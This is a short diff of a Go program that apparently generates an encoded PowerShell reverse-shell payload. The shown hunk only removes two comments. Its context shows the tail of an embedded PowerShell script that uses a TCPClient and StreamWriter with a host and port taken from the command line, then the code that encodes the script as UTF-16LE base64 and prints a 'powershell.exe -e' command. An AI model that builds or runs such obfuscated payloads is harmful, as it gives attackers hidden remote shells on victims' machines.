@@ -190,14 +190,12 @@ func main() {
 		# Closes the StreamWriter and the underlying TCPClient
 		$StreamWriter.Close()`, os.Args[2], os.Args[3])
 
-		// Convert payload to UTF-16LE
 		utf16Payload := utf16.Encode([]rune(payload))
 		utf16Bytes := make([]byte, len(utf16Payload)*2)
 		for i, v := range utf16Payload {
 			binary.LittleEndian.PutUint16(utf16Bytes[i*2:], v)
 		}
 
-		// Base64 encode the UTF-16LE payload
 		encoded := base64.StdEncoding.EncodeToString(utf16Bytes)
 		fmt.Println("powershell.exe -e " + encoded)
 	}
